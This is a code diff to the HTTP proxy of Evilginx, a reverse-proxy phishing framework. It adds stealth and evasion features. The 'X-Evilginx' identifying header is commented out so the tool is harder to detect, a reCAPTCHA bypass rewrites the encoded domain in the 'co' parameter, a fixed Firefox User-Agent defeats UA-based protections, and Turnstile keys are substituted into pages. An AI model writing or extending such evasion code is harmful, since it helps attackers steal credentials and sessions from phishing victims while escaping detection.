@@ -477,7 +477,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						return p.blockRequest(req)
 					}
 				}
-				req.Header.Set(p.getHomeDir(), o_host)
+				// Remove X-Evilginx header for stealth - commented out easter egg
+				// req.Header.Set(p.getHomeDir(), o_host)
 
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
@@ -652,22 +653,46 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				// patch GET query params with original domains
+				// patch GET query params with original domains & bypass recaptcha
 				if pl != nil {
 					qs := req.URL.Query()
 					if len(qs) > 0 {
 						for gp := range qs {
 							for i, v := range qs[gp] {
 								qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
+								// Google reCAPTCHA bypass - replace phishing domain with original domain in co parameter
+								if gp == "co" && req.Host != "" {
+									// Check if this is a base64 encoded domain in reCAPTCHA
+									if decoded, err := base64.StdEncoding.DecodeString(v); err == nil {
+										decodedStr := string(decoded)
+										// Replace phishing domain with original domain
+										if strings.Contains(decodedStr, req.Host) {
+											originalDomain := p.getOriginalDomain(pl, req.Host)
+											if originalDomain != "" {
+												newDecoded := strings.Replace(decodedStr, req.Host, originalDomain, -1)
+												qs[gp][i] = base64.StdEncoding.EncodeToString([]byte(newDecoded))
+												log.Debug("[%d] reCAPTCHA bypass: replaced domain in co parameter", ps.Index)
+											}
+										}
+									}
+								}
 							}
 						}
 						req.URL.RawQuery = qs.Encode()
 					}
 				}
 
+				// Replace User Agent with a standard Firefox User Agent to bypass UA-based protections
+				useragent := req.Header.Get("User-Agent")
+				if useragent != "" {
+					req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0")
+					log.Debug("[%d] Replaced User Agent with Firefox", ps.Index)
+				}
+
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
-					req.Header.Set(p.getHomeDir(), o_host)
+					// Remove X-Evilginx header for stealth - commented out easter egg
+					// req.Header.Set(p.getHomeDir(), o_host)
 					body, err := ioutil.ReadAll(req.Body)
 					if err == nil {
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
@@ -1516,6 +1541,13 @@ func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, params *map[
 	body = strings.Replace(body, "{lure_url_html}", lure_url, -1)
 	body = strings.Replace(body, "{lure_url_js}", js_url, -1)
 
+	// Replace Turnstile site key with configured value
+	if p.cfg.GetTurnstileEnabled() {
+		body = strings.Replace(body, "{turnstile_site_key}", p.cfg.GetTurnstileSiteKey(), -1)
+	} else {
+		body = strings.Replace(body, "{turnstile_site_key}", "1x00000000000000000000BB", -1) // Default placeholder
+	}
+
 	return body
 }
 
@@ -1829,6 +1861,15 @@ func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
 
 func (p *HttpProxy) getHomeDir() string {
 	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
+}
+
+func (p *HttpProxy) getOriginalDomain(pl *Phishlet, phishDomain string) string {
+	for _, ph := range pl.proxyHosts {
+		if strings.HasSuffix(phishDomain, ph.phish_sub+"."+pl.Site) {
+			return ph.orig_sub + "." + ph.domain
+		}
+	}
+	return ""
 }
 
 func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
